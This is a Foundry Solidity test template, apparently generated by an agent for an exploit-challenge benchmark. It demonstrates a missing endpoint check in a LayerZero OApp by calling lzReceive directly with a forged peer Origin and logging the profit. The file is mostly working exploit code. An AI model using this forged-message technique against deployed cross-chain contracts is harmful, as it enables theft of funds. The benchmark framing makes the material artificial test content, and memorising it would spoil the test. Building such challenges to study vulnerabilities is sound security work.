// SPDX-License-Identifier: MIT
// AGENT-GENERATED harness: {{STRATEGY_ID}} on {{CHALLENGE_NAME}}.
// Technique: the OApp checks Origin against its peer but never checks that
// msg.sender is the LayerZero endpoint — so the attacker calls lzReceive
// directly with a peer-consistent Origin and pays itself.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {LayerZeroNoEndpointCheck} from "../../src/challenges/LayerZeroNoEndpointCheck.sol";

contract {{TEST_CONTRACT}} is Test {
    function test_agentSolve() public {
        address realEndpoint = makeAddr("realEndpoint");
        vm.deal(address(this), 300 ether);
        LayerZeroNoEndpointCheck oapp = new LayerZeroNoEndpointCheck(realEndpoint);
        (bool ok, ) = address(oapp).call{value: 100 ether}("");
        require(ok, "funding failed");
        oapp.setPeer(30101, bytes32(uint256(uint160(0x6055))));

        // Peer-consistent Origin, delivered by the ATTACKER (this contract),
        // not the endpoint. A correct OApp reverts: only the endpoint may
        // call lzReceive.
        LayerZeroNoEndpointCheck.Origin memory origin = LayerZeroNoEndpointCheck.Origin({
            srcEid: 30101,
            sender: bytes32(uint256(uint160(0x6055))),
            nonce: 1
        });
        oapp.lzReceive(
            origin,
            bytes32(0),
            abi.encode(address(this), 5 ether),
            address(this),
            ""
        );

        assertGt(address(this).balance, 200 ether, "forged delivery paid nothing");
        console2.log("[PROFIT_WEI]", address(this).balance - 200 ether);
    }

    receive() external payable {}
}
